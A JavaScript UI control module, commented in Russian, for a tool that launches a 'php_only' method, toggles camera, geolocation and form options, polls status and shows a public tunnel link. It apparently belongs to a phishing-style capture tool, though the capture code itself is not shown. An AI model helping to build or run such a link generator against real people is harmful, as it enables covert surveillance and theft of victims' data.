/**
 * Управление: форма запуска/остановки, опции, опрос статуса, отображение ссылки.
 */
import { state } from "../state.js";
import { apiRun } from "/js/app.js";
import { escapeHtml, getFeatureOptions } from "../utils.js";
import { updateSessionMetrics } from "./session.js";
import {
  TOOL_ID,
  API,
  FEATURE_IDS,
  FEATURE_KEYS,
  METHOD_HINTS,
  POLL_IDS,
  POLL_INTERVALS,
} from "../config.js";

export function initControl(container) {
  const form = container.querySelector("#gc-form");
  const resultEl = container.querySelector("#gc-result");
  const statusEl = container.querySelector("#gc-status");
  const copyBtn = container.querySelector("#gc-copy-btn");
  const submitBtn = container.querySelector("#gc-btn-start");
  const stopBtn = container.querySelector("#gc-btn-stop");
  const methodSelect = container.querySelector("#gc-method");
  const methodHint = container.querySelector("#gc-method-hint");
  const statusCheckbox = container.querySelector("#gc-feat-status");

  function showCopyFeedback(msg) {
    if (!statusEl) return;
    statusEl.textContent = msg;
    if (state.copyFeedbackTimer) clearTimeout(state.copyFeedbackTimer);
    state.copyFeedbackTimer = setTimeout(() => {
      statusEl.textContent = "";
      state.copyFeedbackTimer = null;
    }, 2000);
  }

  function showLink(link, localUrl) {
    const primaryUrl = link || localUrl || "";
    if (primaryUrl === state.lastLinkUrl) return;
    state.lastLinkUrl = primaryUrl;
    resultEl.classList.remove("gc-link-placeholder");
    if (primaryUrl) {
      resultEl.innerHTML = `<a href="${escapeHtml(primaryUrl)}" target="_blank" rel="noopener" class="gc-link-url">${escapeHtml(primaryUrl)}</a>`;
      if (copyBtn) {
        copyBtn.setAttribute("data-copy", primaryUrl);
        copyBtn.style.display = "inline-flex";
      }
    } else {
      resultEl.innerHTML = "";
      resultEl.classList.add("gc-link-placeholder");
      resultEl.textContent = "(ссылка не сгенерирована)";
      if (copyBtn) copyBtn.style.display = "none";
    }
  }

  async function pollStatus() {
    try {
      const res = await fetch(API.runStatus);
      const st = await res.json();
      if (statusCheckbox) statusCheckbox.checked = !!st.running;
      let statusMsg = "";
      if (st.error) {
        statusMsg = st.error;
        if (!st.link && !st.local_url) {
          resultEl.className = "gc-link-box gc-link-error";
          if (resultEl.textContent !== st.error) resultEl.textContent = st.error;
        }
      }
      if (st.link || st.local_url) {
        state.serveoWaitStart = 0;
        showLink(st.link || null, st.local_url || null);
        resultEl.className = "gc-link-box gc-link-success";
      } else if (st.running && !st.link && !st.local_url) {
        if (state.serveoWaitStart === 0) state.serveoWaitStart = Date.now();
        const sec = Math.floor((Date.now() - state.serveoWaitStart) / 1000);
        statusMsg = "Ожидание публичной ссылки… " + (sec > 0 ? sec + " сек" : "");
      }
      if (!st.running) {
        state.sessionStartTime = 0;
        if (POLL_IDS.status) clearInterval(POLL_IDS.status);
        POLL_IDS.status = null;
        state.serveoWaitStart = 0;
        submitBtn.style.display = "";
        stopBtn.style.display = "none";
        submitBtn.disabled = false;
      } else if (state.sessionStartTime === 0 && st.started_at != null) {
        state.sessionStartTime = st.started_at * 1000;
      } else if (state.sessionStartTime === 0) {
        state.sessionStartTime = Date.now();
      }
      if (statusEl && statusEl.textContent !== statusMsg) statusEl.textContent = statusMsg;
      updateSessionMetrics(container);
      return st.running;
    } catch (_) {
      return true;
    }
  }

  function updateMethodHint() {
    if (methodHint && methodSelect) {
      methodHint.textContent = METHOD_HINTS[methodSelect.value] || METHOD_HINTS.php_only;
    }
  }
  methodSelect?.addEventListener("change", updateMethodHint);
  updateMethodHint();

  async function loadOptions() {
    try {
      const res = await fetch(API.options);
      const opts = await res.json();
      FEATURE_KEYS.forEach((k, i) => {
        const el = container.querySelector("#" + FEATURE_IDS[i]);
        if (el) el.checked = k === "camera" || k === "geo" || k === "form" ? opts[k] !== false : opts[k] === true;
      });
    } catch (_) {}
  }
  function saveOptions() {
    fetch(API.options, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(getFeatureOptions(container)),
    }).catch(() => {});
  }
  loadOptions();
  FEATURE_IDS.forEach((id) => {
    container.querySelector("#" + id)?.addEventListener("change", saveOptions);
  });

  stopBtn?.addEventListener("click", async () => {
    try {
      const res = await fetch(API.stop, { method: "POST" });
      const data = await res.json();
      if (data.success) statusEl.textContent = "Остановка…";
      await pollStatus();
    } catch (_) {}
  });

  form?.addEventListener("submit", async (e) => {
    e.preventDefault();
    const fd = new FormData(form);
    const params = { method: fd.get("method") || "php_only", ...getFeatureOptions(container) };
    resultEl.textContent = "";
    resultEl.className = "gc-link-box";
    resultEl.classList.remove("gc-link-placeholder");
    statusEl.textContent = "Запуск…";
    submitBtn.disabled = true;
    submitBtn.style.display = "none";
    stopBtn.style.display = "inline-block";
    try {
      const data = await apiRun(TOOL_ID, params);
      if (data.started) {
        state.sessionStartTime = Date.now();
        statusEl.textContent = data.message || "Запущено.";
        if (data.local_url) {
          showLink(null, data.local_url);
          resultEl.className = "gc-link-box gc-link-success";
        }
        POLL_IDS.status = setInterval(pollStatus, POLL_INTERVALS.status);
        pollStatus();
      } else {
        statusEl.textContent = "";
        submitBtn.style.display = "";
        stopBtn.style.display = "none";
        submitBtn.disabled = false;
        resultEl.className = "gc-link-box gc-link-error";
        resultEl.textContent = data.error || "Ошибка";
      }
    } catch (err) {
      statusEl.textContent = "";
      submitBtn.style.display = "";
      stopBtn.style.display = "none";
      submitBtn.disabled = false;
      resultEl.className = "gc-link-box gc-link-error";
      resultEl.textContent = err.message || "Ошибка сети";
    }
  });

  return { showLink, pollStatus, showCopyFeedback };
}
